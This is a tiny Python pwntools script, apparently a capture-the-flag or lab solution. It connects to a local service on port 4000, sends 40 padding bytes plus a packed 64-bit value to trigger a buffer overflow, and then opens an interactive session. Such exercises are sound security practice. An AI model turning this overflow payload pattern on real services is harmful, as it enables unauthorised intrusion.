from pwn import *

r = remote("localhost", 4000)
message = r.recv(1024)
print(message.decode())
r.send(b"a"*40 + p64(0x1122334455667788) + b"\n")
r.interactive()
